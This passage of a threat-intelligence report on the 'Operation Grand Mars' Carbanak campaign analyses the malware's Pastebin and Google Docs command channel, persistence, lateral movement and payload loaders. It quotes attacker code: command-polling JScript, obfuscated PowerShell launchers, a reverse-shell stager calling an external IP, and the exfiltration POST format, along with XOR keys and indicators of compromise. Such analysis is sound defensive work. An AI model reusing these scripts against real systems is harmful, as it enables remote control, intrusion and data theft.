“HKEY_CURRENT_USER\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\\nlasts”;\nWshShell.CurrentDirectory = GLBFolderPlus;\nLog();\nGetCommand();\n\n**Figure 28. \u0003GetSourceCode function**\n\nFile dttsg.txt has the following structure and is split into two sections “last” and “code” and provides another covert\nchannel during this operation.\n\n\n{last: “abc123”, code: “ZGltIHh4eA==”}\n\n\n**Figure 29. \u0003Code from Pastebin**\n\nData from section “last” is written into registry perhaps to keep track of last executed command and “code” which\nis Base64 encoded used as an argument and allows attackers to execute one of the following commands “Destroy”,\n“GetCompInfo”, “GetProcList” and “RunCMDLine”, as displayed below. However, usage of this feature was not\nobserved during our investigation.\n\n\n-----\n\n###### Operation Grand Mars: Defending Against Carbanak Cyber Attacks\n\nvar cod_data = Base64.decode(cmb_ob.c);\n\nif(cod_data == “#deleteBot#”){\ndestroy();\n}else if(cod_data == “#GetCompInfo#”){\nLog(“$stdOut$” + GetComputerInform());\n}else if(cod_data == “#GetProcList#”){\nLog(“$stdOut$” + GetCompProcess());\n\n}else if( cod_data.indexOf(“#RunCMDLine#”) !== -1){\nvar cmd_str = split(cod_data,’#RunCMDLine#’,2);\nLog(“$stdOut$” + RunCMDLine(cmd_str[1]));\n}else{\nvar tempname1 = “LanCradDriver.ini”;\nvar tempname2 = “LanCradDriver.vbs”;\nvar tmpPath = GLBFolderPlus;\nvar tempath1 = tmpPath + “\\\\”+tempname1;\nvar tempath2 = tmpPath + “\\\\”+tempname2;\n\nvar f = FSO.OpenTextFile(tempath1,2,false,-1);\nf.Write(cod_data);\nf.Close();\n\n**Figure 30. \u0003Arguments from Pastebin**\n\n**Figure 31. \u0003Pastebin account used for tracking**\n\nContinuing into the execution of GetCommand() it connects again to Google Docs, using the spreadsheet key\nobtained in the output of the LoadLinkSettings() and saves the data into the LanCradDriver.ini file. The latter file was\ninitially created as an empty file and now it becomes another key component during the operation.\n\n\n-----\n\n###### Operation Grand Mars: Defending Against Carbanak Cyber Attacks\n\nfunction GetCommand() {\ntry {\nvar legc = getLastExeGoogCmd();\nvar cmb_ob = {}\ncmb_ob.flag = false;\nvar go_com = InetRead(“https://docs.google.com/spreadsheet/ccc?key=” +\nspreadsheetkey);\nif( go_com[‘stat’] >= 200 && go_com[‘stat’] < 300){\nvar cmd_txt = HTMLParse(go_com[‘text’]).document.documentElement.innerText;\nvar command = split(cmd_txt,’$$$’,3);\nif (command.length == 4) {\ncmb_ob.c = command[2];\ncmb_ob.l = command[1];\ncmb_ob.flag = true;\n.\n.\n.\n\nvar tempname1 = “LanCradDriver.ini”;\nvar tempname2 = “LanCradDriver.vbs”;\nvar tmpPath = GLBFolderPlus;\nvar tempath1 = tmpPath + “\\\\”+tempname1;\nvar tempath2 = tmpPath + “\\\\”+tempname2;\n\nvar f = FSO.OpenTextFile(tempath1,2,false,-1);\nf.Write(cod_data);\nf.Close();\n\nWScript.Sleep(5000);\nWshShell.Run(‘wscript.exe “’ + tempath2 + ‘”’,0,false);\n\n}\n}\n\n**Figure 32. \u0003Downloading code from Google Docs (truncated)**\n\nThe actual data which is Base64 encoded as seen in the Google spreadsheet is then decoded and stored in the\nLanCradDriver.ini file.\n\n**Figure 33. \u0003Encoded PowerShell commands retrieved from Google Spreadsheet**\n\nContents of the new file, LanCradDriver.ini, reveal that it is actually a VBScript executing a PowerShell script. As a\nfinal step TransbaseOdbcDriver.js executes LanCradDriver.vbs using wscript.exe.\n\n\n-----\n\n###### Operation Grand Mars: Defending Against Carbanak Cyber Attacks\n\nOn Error Resume Next\nSet objShell = CreateObject(“Wscript.Shell”)\nobjShell.Run(“C:\\Windows\\syswow64\\WindowsPowerShell\\v1.0\\powershell.exe -NoP -NonI\n\n - ExecutionPolicy Bypass -C “”sal a New-Object;iex(a IO.StreamReader((a IO.Compression.\nDeflateStream([IO.MemoryStream][Convert]::FromBase64String(\n\n**Figure 34. \u0003LaCradDriver.ini (truncated)**\n\n###### LanCradDriver.vbs\n\nThis script simply reads and executes the commands written in the LanCradDriver.ini file (by the\nTransbaseOdbcDriver.js script).\n\n**Hash Type** **Value**\n\nMD5 4EC7088AAC32C94A7046810925BC1697\n\nSHA-1 7B46BB249485B36C318D53FA070D945EA8DBF606\n\nSHA256 313E38756B80755078855FE0F1FFEA2EA0D47DFFFCBE2D687AAA8BDB37C892F4\n\nSSDeep 384:MuVpmKuHXtRY8DmPF86QIWL0z9T6l+aBUBiigzxPs2hRhi:UKgHRmPF86JW4z9T6lBUIiAPhfi\n\n**Table 3. \u0003Hashes of LanCradDriver.vbs**\n\nOn Error Resume Next\nDim objFSO, strFile, ReadAllTextFile\nSet objFSO = CreateObject(“Scripting.FileSystemObject”)\nDim currDir, currDirPlus\nSet objFSO = CreateObject(“Scripting.FileSystemObject”)\ncurrDir = objFSO.GetParentFolderName(Wscript.ScriptFullName)\ncurrDirPlus = currDir\nstrFile = currDirPlus & “\\LanCradDriver.ini”\nSet objFile = objFSO.OpenTextFile(strFile,1,false,-1)\nIf objFile.AtEndOfStream Then\nReadAllTextFile = “”\nElse\nReadAllTextFile = objFile.ReadAll\nEnd If\nobjFile.Close\nExecuteGlobal ReadAllTextFile\n\n**Figure 35. \u0003LanbCradDriver.vbs**\n\n###### LanCradDriver.ini\n\nAs seen before TransbaseOdbcDriver.js connects to Google Docs and reads a cell located in a spreadsheet in\nBase64 encoded format. After decoding, the data is then stored as a text file in LanCradDriver.ini\n\n**Hash Type** **Value**\n\nMD5 EADF92DE422989D86214AF7E4E5647D7\n\nSHA-1 8427358C4C21B7A0C14D638DF1017D0A7FA21182\n\nSHA256 DEA485D817D712A5B61A8F31123F914890183D2F9B0BF0F3AF89366085596D5D\n\nSSDeep 192:1/qgqjmQDJ35cnrS+vDa4j4Sdp/qgqjmQDJ35cnrS+vDa4j4Sd5:8g32pSnrpa84+Ig32pSnrpa84+5\n\n**Table 4. \u0003Hashes of LanCradDriver.ini**\n\nThe following is a PowerShell command retrieved from the Google spreadsheet and written to the LanCradDriver.ini\nfile post-execution of TransbaseOdbcDriver.js script on the infected system.\n\n|Hash Type|Value|\n|---|---|\n|MD5|4EC7088AAC32C94A7046810925BC1697|\n|SHA-1|7B46BB249485B36C318D53FA070D945EA8DBF606|\n|SHA256|313E38756B80755078855FE0F1FFEA2EA0D47DFFFCBE2D687AAA8BDB37C892F4|\n|SSDeep|384:MuVpmKuHXtRY8DmPF86QIWL0z9T6l+aBUBiigzxPs2hRhi:UKgHRmPF86JW4z9T6lBUIiAPhfi|\n\n|Hash Type|Value|\n|---|---|\n|MD5|EADF92DE422989D86214AF7E4E5647D7|\n|SHA-1|8427358C4C21B7A0C14D638DF1017D0A7FA21182|\n|SHA256|DEA485D817D712A5B61A8F31123F914890183D2F9B0BF0F3AF89366085596D5D|\n|SSDeep|192:1/qgqjmQDJ35cnrS+vDa4j4Sdp/qgqjmQDJ35cnrS+vDa4j4Sd5:8g32pSnrpa84+Ig32pSnrpa84+5|\n\n\n-----\n\n###### Operation Grand Mars: Defending Against Carbanak Cyber Attacks\n\nOn Error Resume Next\nSet objShell = CreateObject(“Wscript.Shell”)\nobjShell.Run(“C:\\Windows\\syswow64\\WindowsPowerShell\\v1.0\\powershell.exe -NoP -NonI -Execu­\ntionPolicy Bypass -C “”sal a New-Object;iex(a IO.StreamReader((a IO.Compression.DeflateStream([IO.\nMemoryStream][Convert]::FromBase64String(‘rVhtT+NIEv7uX9ETWYqjSawEhtGK00oXAuxEQyAimWHv2GjU2JWkD8edb\nbeB7Nz896tqtxPbMRyMlg/E7q56uqq6Xu0Ox+xX1vx44B/\n… … … … (truncated) … … … … …\njKlOmDez/vDi7NTln0ygrC1p+bhLsljUMuEhrn8HavF2q4UI39vaUv3Pw==’),[IO.Compression.CompressionMode]::Dec\nompress)),[Text.Encoding]::ASCII)).ReadToEnd()”””),0, True\nobjShell.Run(“powershell.exe -NoP -NonI -ExecutionPolicy Bypass -C “”sal a New-Object;iex(a\nIO.StreamReader((a IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String(‘rVh­\ntT+NIEv7uX9ETWYqjSawEhtGK00oXAuxEQyAimWHv2GjU2JWkD8edbbeB7Nz896tqtxPbMRyMlg/E7q56uqq6Xu0Ox+xX1vx44B\n/0uv7Bkd876DUddyyVxvWjQ8f9KpROedSPIhngkhunUeS4AwVcw3SJP+Fu9YYLfS7VRMSLCK7u/gOB3m3+fnX9+exf+\n… … … … (truncated) … … … … … /epSVJVi+dz+WUsUgMgO3acu69CHy731X7rV0tCYglqJOBPYVpfsNCM+OjqPFxgnN/3h\n9Nt0ODq7+jKlOmDez/vDi7NTln0ygrC1p+bhLsljUMuEhrn8HavF2q4UI39vaUv3Pw==’),[IO.Compression.CompressionM\node]::Decompress)),[Text.Encoding]::ASCII)).ReadToEnd()”””),0, True\n\n**Figure 36. \u0003LanCradDriver.ini (truncated)**\n\nNotice above the usage of Base64 encoding and Deflate in order to conceal the actual PowerShell code.\n\nUpon successful execution of TransBaseOdbcDriver.js this is how the folder contents look. Note that\nLanCradDriver.ini is no longer a zero-byte file since it has been populated using the commands retrieved from\nthe Google spreadsheet.\n\n**Figure 37. \u0003LanCradDriver.ini populated post-execution of TransbaseOdbcDriver.js**\n\n###### Activity Summary\n\nIn summary, the role of the four dropped files is visually represented by the following activity diagram:\n\n**Figure 38. \u0003Role of dropped files and sequence of execution**\n\n\n-----\n\n###### Operation Grand Mars: Defending Against Carbanak Cyber Attacks\n\nThe following diagram is a visualization of the Command & Control mechanism used by the malware during this\noperation that involves use of Pastebin, Google Docs (spreadsheets), and Google Forms to exert control over the\ninfected systems.\n\n**Figure 39. \u0003Activity diagram showing C&C involving Google Forms and Docs**\n\n\n-----\n\n###### Operation Grand Mars: Defending Against Carbanak Cyber Attacks\n\n**Figure 40. \u0003Activity diagram showing C&C in case Google Spreadsheet not available**\n\nUsing such a topology of C&C, while not rare, further indicates that we are dealing with a highly organized and\nsophisticated group of attackers rather than an opportunistically motivated, relatively unorganized group or lone\nwolf attackers.\n\n\n-----\n\n###### Operation Grand Mars: Defending Against Carbanak Cyber Attacks\n\n ACHIEVING PERSISTENCE\n\n PowerShell Script\n\nAt this point the recently downloaded from Google Docs PowerShell script was decoded and executed on the\ninfected system. As seen in Figure 36 the actual script used PowerShell Deflate and Base64 functions to conceal\nthe payload. After reversing these functions, the output indicates that this script was designed to setup a form of\npersistent backdoor often referred to as a TCP reverse connect shell.\n\nThe following results has been derived:\n\n**•** Script connects to an external IP using a common port such as 80. However, it is not using HTTP protocol for transmission.\n\n**•** Memory allocation and thread creation code exist.\n\n**•** It receives an encrypted (XOR) payload from the external IP.\n\n**•** The payload is then decrypted using XOR key of 0x50 and written directly to memory.\n\n$IP = ‘80. 84.49.61’\n$Port = 80\n$XORKEY = 0x50\n$VirtualAlloc = $null\n$CreateThread = $null\n$WaitForSingleObject = $null\n$XORKEY = 0x50\nfunction XorByteArr\n… … … … (truncated) … … … … …\n{\n$tcpClient = New-Object System.Net.Sockets.TCPClient\nTry\n{\n$connect = $tcpClient.Connect($IP, $Port)\n}\n… … … … (truncated) … … … … …\n$stream = $TcpClient.GetStream()\n$payloadSizeBuff = New-Object Byte[] -ArgumentList 4\n$Null = $stream.Read($payloadSizeBuff, 0, 4)\n\n[Int]$payloadSize = [System.BitConverter]::ToInt32($payloadSizeBuff, 0)\nWrite-Output “Payload size - $payloadSize”\n\n[IntPtr]$shellcodeBuff = $VirtualAlloc.Invoke([IntPtr]::Zero, [Math]::Max([Int]($payloadSize + 5),\n0x1000 ), 0x3000, 0x\n40)\n\n[System.Runtime.InteropServices.Marshal]::WriteByte($shellcodeBuff, 0, [Byte]0xBF)\n\n[System.Runtime.InteropServices.Marshal]::WriteIntPtr($shellcodeBuff, 1, $tcpClient.Client.Handle)\n$shellcodeBuffTmp = New-Object Byte[] -ArgumentList $payloadSize\n\n[Int]$bytesRead = 0\nWhile ($payloadSize -gt $bytesRead)\n{\n\n[Int]$netAnswerSize = $stream.Read($shellcodeBuffTmp, $bytesRead, $tcpClient.Available)\n$bytesRead += $netAnswerSize\n}\n$shellcodeBuffTmp = XorByteArr $shellcodeBuffTmp $XORKEY\nCopy-ToUnmanagedMem $shellcodeBuff $shellcodeBuffTmp 5 $payloadSize\nWrite-Output “Received payload, run it in a new thread”\n$threadHandle = $CreateThread.Invoke([IntPtr]::Zero, 0, $shellcodeBuff, [IntPtr]::Zero, 0,\n\n[IntPtr]::Zero)\nif ($threadHandle -ne [IntPtr]::Zero)\n{\nWrite-Output “Successfully created thread!”\nWrite-Output “Meterpreter session created!”\n}\n… … … … (truncated) … … … … …\n\n**Fi** **41 TCP R** _Sh ll f_ _P_ _Sh ll_ _i t_\n\n\n-----\n\n###### Operation Grand Mars: Defending Against Carbanak Cyber Attacks\n\nThe final result of the above script is a memory resident malware providing reverse shell access to cybercriminals.\nAttackers have now successfully achieved persistence into the target infrastructure. The PowerShell command used\nto decode and execute this script along with the method of delivery has many similarities with “PowerSploit - A\nPowerShell Post-Exploitation Framework” and “Veil Framework” well known capable of Antivirus evasion of payloads.\n\n###### Registry Autorun\n\nAdditionally, attackers have achieved persistence by utilizing the “usual suspects” also known as the operating\nsystem’s startup locations. The following key is created in the registry to start the payload automatically after reboot.\n\n\nHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\TransbaseOdbcDriver\n\n\n**Figure 42. \u0003Registry persistence**\n\n###### Task Scheduler\n\nFinally, a scheduled task has been created which is triggered every 30 minutes indefinitely. The name of the created\ntask is SysChecks and it executes the starter.vbs.\n\n**Figure 43. \u0003SysCheks Scheduled Task persistence**\n\nEverything has been copied under the user temporary directory. “C:\\Users\\<user profile>\\AppData\\Local\\Temp”,\nwhich is also very common among malware operations because every user maintains full access within this\nspecific directory.\n\n\n-----\n\n###### Operation Grand Mars: Defending Against Carbanak Cyber Attacks\n\n LATERAL MOVEMENT\n\n Pass the Hash\n\nAnother consequence of the initial phase of this compromise is that attackers gained access to a local Windows OS\nadministrator account and then utilized pass-the-hash in order to steal credentials of a domain level, high privileged user.\n\n**Figure 44. \u0003Event showing Pass-the-Hash indicators**\n\nEvent ID 4624 displayed above shows the use of a local account performing network logon (Logon Type:3) using a\nrandomized source computer name (Workstation Name: T5NMapiY4kGetJDe), probably the result of an automated tool.\n\nPass the hash is a technique where attackers, after successfully taking control of a system, steal credential hashes\nthat are then used to perform authentication to other systems. This technique always benefits attackers especially if\nlocal accounts share the same password within the infrastructure.\n\nUltimately this allowed attackers to achieve domain or even enterprise admin access and gain network access by\nutilizing several resources as Command & Control points in Europe and US.\n\nFurther investigation of the attacked infrastructure showed that the intruders deployed similar PowerShell scripts or\nembedded batch files in order to spread within the environment. A large number of internal systems recorded events\nsimilar to the ones listed below:\n\n\n-----\n\n###### Operation Grand Mars: Defending Against Carbanak Cyber Attacks\n\nSource:    Service Control Manager\nDate:     09/11/2016 15:40:21\nEvent ID:   7045\nTask Category: None\nLevel:     Information\nKeywords:   Classic\nUser:\nComputer:\nDescription:\nThe description for Event ID 7045 from source Service Control Manager cannot be found. Either the\ncomponent that raises this event is not installed on your local computer or the installation is\ncorrupted. You can install or repair the component on the local computer.\n\nIf the event originated on another computer, the display information had to be saved with the\nevent.\n\nThe following information was included with the event:\n\nEdAeEJcGXdXJBHeX\n%COMSPEC% /C start %COMSPEC% /C \\WINDOWS\\Temp\\EyzxpCpBHlaNQvIb.bat\nuser mode service\ndemand start\nLocalSystem\n\n**Figure 45. \u0003Batch file used for spreading**\n\nLog Name:   System\nSource:    Service Control Manager\nDate:     09/11/2016 19:31:29\nEvent ID:   7045\nTask Category: None\nLevel:     Information\nKeywords:   Classic\nUser:\nComputer:\nDescription:\nThe description for Event ID 7045 from source Service Control Manager cannot be found. Either the\ncomponent that raises this event is not installed on your local computer or the installation is\ncorrupted. You can install or repair the component on the local computer.\n\nIf the event originated on another computer, the display information had to be saved with the\nevent.\n\nThe following information was included with the event:\n\ndb57729\n%COMSPEC% /b /c start /b /min powershell.exe -nop -w hidden -encodedcommand JABzAD0ATgBlAHcALQBPA­\nGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACgALABbAEMAbwBuAHYAZQByAHQAXQA6ADoARgByA­\nG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACIASAA0AHMASQBBAEEAQQBBAEEAQQBBAEEAQQBMADEAWAAvAFcALwBhA­\nFAAQgBEACsAdQBmAHcAVgAwAFYAUQBwAGkAVQBvAEoAVQBOAFoAMQBrAHkAYgBOAGYASQBjAEIAaABhAFoAUQBLAEUAUABJAEo­\nARQA1AHcANgA4AFEAMABkAGsAcgBwAHQAdgAvADkAdgBYAHoAUQBzA\n… … … … (truncated) … … … … …\nvD89IRln4wgbO2pebAr8pjUMqHLXP6O3WJtV4qZv7e0pfsH’),[IO.Compression.CompressionMode]::Decompress)),[T\next.Encoding]::ASCII)).ReadToEnd()”\nuser mode service\ndemand start\nLocalSystem\n\n**Figure 46. \u0003PowerShell script used for spreading**\n\nDuring this operation several PowerShell scripts were discovered similar to the initial one downloaded from Google\nDocs. The major difference among them was the C&C IP, which was one of several hosts located in Europe.\n\n\n-----\n\n###### Operation Grand Mars: Defending Against Carbanak Cyber Attacks\n\n FURTHER MALICIOUS FILES\n\nA Forensics Timeline Analysis of file system activity around the same time and date as that of the\nTransbaseOdbcDriver.js and other companion files that were dropped into the user’s Temp folder, revealed the\nfollowing suspicious executables/scripts:\n\n**1.** AdobeUpdateManagementTool.vbs (connect to C&C and perform data exfiltration)\n\n**2.** UVZHDVlZ.exe (variant of Carbanak)\n\n**3.** Update.exe (Cobalt Strike’s post-exploitation tool beacon)\n\n**4.** 322.exe (TCP reverse shell)\n\nAnalysis of these executables found them to be of a malicious nature and primarily designed to setup persistence or\ndata exfiltration.\n\n###### AdobeUpdateManagementTool.vbs\n\nMalicious script written in VBScript capable of receiving commands from the attacker to download and execute EXE files,\nVBScript or PowerShell script files. Exfiltrated data is sent to the attacker’s IP addresses through HTTP POST tunnel.\n\nWhile the filename observed in our investigation was AdobeUpdateManagementTool.vbs it is common for attackers\nto use different file names in different campaigns. The hashes that identify this file uniquely (and useful in threat\ndetection and malware analysis) are:\n\n**Hash Type** **Value**\n\nMD5 CE7E9C3FB2872D4F500FED248228C3AC\n\nSHA-1 F040E484DA423540E0A398BAA57E00226A7689D9\n\nSHA256 DDBF9963FE77ABDF97DE51A27509432ED963657D5F598E2179CEC882B0335334\n\nSSDeep 192:1/qgqjmQDJ35cnrS+vDa4j4Sdp/qgqjmQDJ35cnrS+vDa4j4Sd5:8g32pSnrpa84+Ig32pSnrpa84+5\n\n**Table 5. \u0003Hashes of AdobeUpdateManagementTool.vbs**\n\nAdobeUpdateManagementTool.vbs, on execution, drops the following files after creating a folder\n%AllUsersProfile% + “\\Dropebox” + <username> (for example: C:\\ProgramData\\DropeboxJoePC):\n\n**•** screenshot__.ps1: PowerShell script that takes a screenshot of the active desktop\n\n**•** screenshot__.png: Screenshot image captured by the PS script above is stored in this file\n\n**•** exe__.exe: Executable file sent by the attacker\n\n**•** vb__.vbs: VBscript sent by the attacker\n\n**•** ps1__.ps1: PowerShell script sent by the attacker\n\n**•** insatller.vbs: Updater VBS script sent by the attacker\n\nThis malicious script sends a specially crafted request to the attacker’s Command & Control server and receives\nhashed (MD5) commands back from the server in response. These commands are then executed on the\ncompromised system.\n\n|Hash Type|Value|\n|---|---|\n|MD5|CE7E9C3FB2872D4F500FED248228C3AC|\n|SHA-1|F040E484DA423540E0A398BAA57E00226A7689D9|\n|SHA256|DDBF9963FE77ABDF97DE51A27509432ED963657D5F598E2179CEC882B0335334|\n|SSDeep|192:1/qgqjmQDJ35cnrS+vDa4j4Sdp/qgqjmQDJ35cnrS+vDa4j4Sd5:8g32pSnrpa84+Ig32pSnrpa84+5|\n\n\n-----\n\n###### Operation Grand Mars: Defending Against Carbanak Cyber Attacks\n\n**Command in**\n**Description of the command**\n**clear text**\n\ninfo Gets system information and sends it to the C&C server via a HTTP POST request.\n\nproc Enumerates all running process.\n\nCaptures screenshot of the desktop image (this command first drops and executes the file\n\nscrin screenshot  ps1 and the image is saved to screenshot  .png. The image is then sent to the C&C\n\nserver through HTTP POST tunnel).\n\nAttacker sends this command with an accompanying executable file that is saved to exe  .exe. The\n\nexe\n\nexe file is transient for a very short period of time on the system before getting deleted.\n\nAttacker sends this command with an accompanying VBScript that is saved as vb .vbs.\nThe script is executed and the result returned is base64 encoded by the script and saved\nto a temporary file in Windows %temp% folder. The result is sent to the control server\n\nvbs through HTTP POST tunnel (see exfiltration detail below). Both files result and script files\n\nare deleted after the execution.\n\nThe results file has the following text format:\n\ntype: vbs time: {current time} result: {output}\n\nProvides a VBScript updater along with this command. The updater script is saved to\nthe file insatller.vbs and then executed. The updater uninstalls its old version. This file,\n\nupdate\n\nlike others, is only briefly present on the file system and is deleted 10 seconds after\nexecution.\n\nThe C&C server sends this command with an accompanying PowerShell script that is\nsaved to the file ps1  .ps. The script is executed and the results returned by the script\nare base64 encoded and saved to a temporary file in Windows %temp% folder. The\n\nps1 results are sent to the C&C server via a HTTP POST tunnel. Both files result and script\n\nfiles are deleted after the execution.\n\nThe results file has the following format:\n\ntype: ps1 time: {current time} result: {result details}\n\n**Table 6. \u0003Examples of supported commands**\n\nThe resulting data upon execution of every command, is exfiltrated via a HTTP POST request to the C&C server as\nshown below:\n\nPOST /{random_name}.jsp?pId==={unique ID %md_id%}<<$>>{MD5 hash of Date & Time Now} <- encrypted in\nRC4 with hardcoded key. The POST parameters may also be iterated up to 3 times.\nUser-agent: Mozilla/5.0 (Linux; U; Android 2.3.3; zh-tw; HTC Pyramid Build/GRI40) AppleWebKit/533.1\n(KHT ML, like Gecko) Version/4.0 Mobile Safari/533.1\nCharset:utf-8\nConnection: Keep-Alive\nKeep-Alive:300\nContent-Type: “multipart/form-data; boundary=”{Random MD5 hash}”\n\n**Figure 47. \u0003HTTP POST request used to exfiltrate data from compromised system**\n\n|Command in clear text|Description of the command|\n|---|---|\n|info|Gets system information and sends it to the C&C server via a HTTP POST request.|\n|proc|Enumerates all running process.|\n|scrin|Captures screenshot of the desktop image (this command first drops and executes the file screenshot ps1 and the image is saved to screenshot .png. The image is then sent to the C&C server through HTTP POST tunnel).|\n|exe|Attacker sends this command with an accompanying executable file that is saved to exe .exe. The exe file is transient for a very short period of time on the system before getting deleted.|\n|vbs|Attacker sends this command with an accompanying VBScript that is saved as vb .vbs. The script is executed and the result returned is base64 encoded by the script and saved to a temporary file in Windows %temp% folder. The result is sent to the control server through HTTP POST tunnel (see exfiltration detail below). Both flies result and script files are deleted after the execution. The results file has the following text format: type: vbs time: {current time} result: {output}|\n|update|Provides a VBScript updater along with this command. The updater script is saved to the file insatller.vbs and then executed. The updater uninstalls its old version. This file, like others, is only briefly present on the file system and is deleted 10 seconds after execution.|\n|ps1|The C&C server sends this command with an accompanying PowerShell script that is saved to the file ps1 .ps. The script is executed and the results returned by the script are base64 encoded and saved to a temporary file in Windows %temp% folder. The results are sent to the C&C server via a HTTP POST tunnel. Both files result and script files are deleted after the execution. The results file has the following format: type: ps1 time: {current time} result: {result details}|\n\n\n-----\n\n###### Operation Grand Mars: Defending Against Carbanak Cyber Attacks\n\n\nThe HTTP POST uses the body format below:\n\n\n--{random MD5 hash}\nContent-Disposition: form-data; name=”{random name}”\n{unique ID and current Date/Time Hash - encrypted with RC4 and Base64}\n--{random MD5 hash}\nContent-Disposition: form-data; name=”{random name}”\npPar1c==={unique ID encrypted with RC4 and Base64}\n--{random MD5 hash}\nContent-Disposition: form-data; name=”{random name}”\npPar2c==={command’s MD5 Hash encrypted with RC4 and Base64}\n--{random MD5 hash}\nContent-Disposition: form-data; name=”{random name}”\npPar3c==={Results/Data/StolenInformation encypted with RC4 and Base64}\n\n\n**Figure 48. \u0003HTTP POST method options**\n\nThe script enters sleep mode for 3-5 minutes between each send “command – exfiltrate results” cycle before\nrunning again.\n\nThe following command and control servers were identified (it is trivial for attackers to keep changing their command\n& control servers so these IPs will most likely be different in other campaigns):\n\n**•** 148.251.18.75\n\n**•** 95.215.46.221\n\n**•** 95.215.46.229\n\n**•** 95.215.46.234\n\n**•** 81.17.28.124\n\nThis file was not detected as malicious by ANY anti-virus tools as reported by VirusTotal. This is definitely a sign of\nsophistication of malware and that of the threat actors behind these attacks.\n\n###### UVZHDVlZ.exe\n\nThis file is a loader for the Anunak malware which is encrypted and embedded inside this executable. The payload\n(Anunak) executable then is injected to svchost.exe and provides backdoor capabilities for attackers to connect to\nand achieve persistent access to the compromised system. The file hashes associated with this executable are:\n\n**Hash Type** **Value**\n\nMD5 DD4F312C7E1C25564A8D00B0F3495E24\n\nSHA-1 499E162CF3A80673890BF7FC9FCBFA51B58DAF45\n\nSHA256 DDAB9C2F975D336A698F4604AC755586C5451AC8DA0A98ECC5D9B8F6993D4E78\n\nSSDeep 6144:T3bX85EjXVQqUzbxHSFOrME+mcNUE27UB:PX85EjFXqZSAMocKc\n\n**Table 7. \u0003Hashes of UVZHDVlZ.exe**\n\nInitially, the main executable decrypts two code modules embedded in its body using the XOR key “PsdTsr8fer3”\n(without the quotes):\n\n**•** The payload loader/process injector\n\n**•** The payload itself - Anunak malware Win32 executable\n\nThe decryption operation is as simple as the encryption, i.e. to XOR the code with the key, skipping every 3 bytes (we\nhave discovered the decryption routine used but have not reproduced the details in this report to maintain brevity).\n\n|Hash Type|Value|\n|---|---|\n|MD5|DD4F312C7E1C25564A8D00B0F3495E24|\n|SHA-1|499E162CF3A80673890BF7FC9FCBFA51B58DAF45|\n|SHA256|DDAB9C2F975D336A698F4604AC755586C5451AC8DA0A98ECC5D9B8F6993D4E78|\n|SSDeep|6144:T3bX85EjXVQqUzbxHSFOrME+mcNUE27UB:PX85EjFXqZSAMocKc|\n\n\n-----\n\n###### Operation Grand Mars: Defending Against Carbanak Cyber Attacks\n\nThe XOR key was identified after disassembling the executable and finding the instruction used to copy the XOR key\nto a heap to be used later for decrypting the loader and embedded executable (see below).\n\n**Figure 49. \u0003XOR key detection**\n\nAs mentioned, the Anunak payload loader is decrypted first followed by decryption of the Anunak malware executable:\n\n**Figure 50. \u0003Payload decoding**\n\n**Figure 51. \u0003Starting Anunak after decrypting it**\n\nThe following command and control servers were identified:\n\n**•** 179..43.140.85 (port: 443)\n\n**•** 107.181.246.189 (port: 443)\n\nThe execution flow of this malware may be visualized (using the Procdot tool [6]) as follows:\n\n**Figure 52. \u0003Procdot visualization of UVZHDVIZ.exe.**\n\nInterestingly, uvzhdviz.exe is signed using a valid digital certificate issued by a Comodo CA, and appears to have\nbeen purchased by providing possibly forged identity information of a company based in Moscow, Russia.\n\n\n-----\n\n###### Operation Grand Mars: Defending Against Carbanak Cyber Attacks\n\n**Figure 53. \u0003Digital certificate details of UVZHDVIZ.exe (Grand Mars)**\n\nUVZHDVlZ.exe was not detected as malicious by ANY anti-virus tools as reported on VirusTotal. This is another\nindicator of expertly crafted malware and sophistication of the attackers behind this campaign.\n\n###### Update.exe\n\nThis executable, like the Anunak loader executable described in the analysis in the previous section, is also signed\nusing a digital certificate issued by Comodo CA and purchased mere weeks before the malware campaign that is\nthe subject of this report. As with the other certificate used to sign the Anunak loader executable, this certificate was\nalso issued using the details, probably fake, of a company based in Moscow, Russia.\n\n**Hash Type** **Value**\n\nMD5 BACE8F2B09C2BFAB35ED9ED98B2E1B83\n\nSHA-1 188D751B7530DB668B88BDB96EDA50A08C119850\n\nSHA256 321BA0DFFEE63518BFE24FF02C0DF6A09692A5D32BCC33AA454AC7431D390F57\n\nSSDeep 6144:T3bX85EjXVQqUzbxHSFOrME+mcNUE27UB:PX85EjFXqZSAMocKc\n\n**Table 8. \u0003Hashes of Update.exe**\n\n|Hash Type|Value|\n|---|---|\n|MD5|BACE8F2B09C2BFAB35ED9ED98B2E1B83|\n|SHA-1|188D751B7530DB668B88BDB96EDA50A08C119850|\n|SHA256|321BA0DFFEE63518BFE24FF02C0DF6A09692A5D32BCC33AA454AC7431D390F57|\n|SSDeep|6144:T3bX85EjXVQqUzbxHSFOrME+mcNUE27UB:PX85EjFXqZSAMocKc|\n\n\n-----\n\n###### Operation Grand Mars: Defending Against Carbanak Cyber Attacks\n\n**Figure 54. \u0003Digital certificate details of update.exe**\n\nThis executable file is actually a loader that creates a new thread of Cobalt Strike’s post-exploitation tool called\nBeacon. The Beacon DLL is encrypted and embedded in the malware body.\n\nInitially, the main executable decrypts two code modules embedded in its body:\n\n**•** Loader Code (itself)\n\n**•** Payload PE File (embedded in its body)\n\nAs with the Anunak loader executable described in the previous section, this file also uses XOR with the following\nkey “keDx8” (without the quotes) identified during the analysis of the disassembled code for both encryption and\ndecryption operations for both the loader code and the embedded PE executable. The figure below shows the\ndisassembled code for decrypting the XORed code.\n\n**Figure 55. \u0003Decryption routine with XOR key**\n\n\n-----\n\n###### Operation Grand Mars: Defending Against Carbanak Cyber Attacks\n\nThe figures below show the encrypted/decrypted loader and PE executable (payload):\n\nFirst the loader code:\n\n**Figure 56. \u0003Loader Code**\n\nThen the payload PE executable file:\n\n**Figure 57. \u0003PE Executable**\n\nAfter successfully decrypting the payload executable, the payload is executed in memory.\n\nWhen the payload is executed, it first allocates memory where it will hold the decrypted beacon DLL.\n\n**Figure 58. \u0003Memory allocation for payload**\n\nIt will then decrypt the DLL file. This is once again done by XORing the encrypted DLL against a block of seemingly\nrandom keys.\n\n**Figure 59: \u0003Routine to decrypt beacon DLL**\n\n**Figure 60. \u0003Decrypted beacon DLL**\n\nIt will then load the DLL to a new thread. The beacon is compiled as a reflective DLL [7]. This allows various payload\nstagers and the stage less artifacts to inject 